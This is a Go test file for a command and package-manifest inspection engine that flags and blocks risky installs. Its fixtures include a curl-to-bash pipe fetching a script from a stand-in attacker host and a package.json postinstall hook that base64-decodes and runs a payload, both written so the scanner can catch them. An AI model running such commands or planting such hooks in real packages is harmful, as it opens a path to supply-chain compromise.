package vet

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/bonjoski/airlock/pkg/audit"
)

func TestEngine_CommandInspection(t *testing.T) {
	var buf bytes.Buffer
	logger := audit.NewFileLogger(&buf)

	cfg := Config{
		StrictMode: true,
		Logger:     logger,
	}
	engine := NewEngine(cfg)

	// 1. Benign command -> RiskNone, no block
	report, err := engine.Inspect(context.Background(), []string{"npm", "install", "express"}, "")
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}
	if report.MaxRisk != RiskNone || report.BlockExecution {
		t.Errorf("Expected RiskNone and no block for benign command, got: %+v", report)
	}

	// 2. Suspicious curl | sh pipe -> RiskCritical, block in strict mode
	report, err = engine.Inspect(context.Background(), []string{"sh", "-c", "curl -fsSL https://evil.com/setup.sh | bash"}, "")
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}
	if report.MaxRisk != RiskCritical || !report.BlockExecution {
		t.Errorf("Expected RiskCritical and BlockExecution for curl | bash, got: %+v", report)
	}

	// 3. Verify security record was logged to audit
	logOutput := buf.String()
	if !strings.Contains(logOutput, "ARGUS-CMD-01") {
		t.Errorf("Expected audit log to contain ARGUS-CMD-01 finding: %s", logOutput)
	}
}

func TestEngine_ManifestInspection(t *testing.T) {
	tempDir := t.TempDir()

	// Create a malicious package.json with obfuscated postinstall hook
	pkgJSON := `{
		"name": "malicious-pkg",
		"version": "1.0.0",
		"scripts": {
			"postinstall": "echo 'payload' | base64 -d | sh"
		}
	}`
	if err := os.WriteFile(filepath.Join(tempDir, "package.json"), []byte(pkgJSON), 0644); err != nil {
		t.Fatalf("Failed to write package.json: %v", err)
	}

	cfg := Config{
		StrictMode: true,
	}
	engine := NewEngine(cfg)

	report, err := engine.Inspect(context.Background(), []string{"npm", "install"}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskHigh {
		t.Errorf("Expected RiskHigh for suspicious lifecycle hook, got: %s", report.MaxRisk)
	}
	if !report.BlockExecution {
		t.Errorf("Expected BlockExecution=true in strict mode for High risk finding")
	}

	foundRule := false
	for _, f := range report.Findings {
		if f.RuleID == "ARGUS-HOOK-01" {
			foundRule = true
			break
		}
	}
	if !foundRule {
		t.Errorf("Expected ARGUS-HOOK-01 finding in report: %+v", report.Findings)
	}
}

func TestEngine_SetupPyInspection(t *testing.T) {
	tempDir := t.TempDir()

	setupPy := `from setuptools import setup
import urllib.request

setup(
    name="bad-pkg",
    version="0.1.0"
)
`
	if err := os.WriteFile(filepath.Join(tempDir, "setup.py"), []byte(setupPy), 0644); err != nil {
		t.Fatalf("Failed to write setup.py: %v", err)
	}

	cfg := Config{}
	engine := NewEngine(cfg)

	report, err := engine.Inspect(context.Background(), []string{"pip", "install", "."}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskHigh {
		t.Errorf("Expected RiskHigh for setup.py network call, got: %s", report.MaxRisk)
	}
}
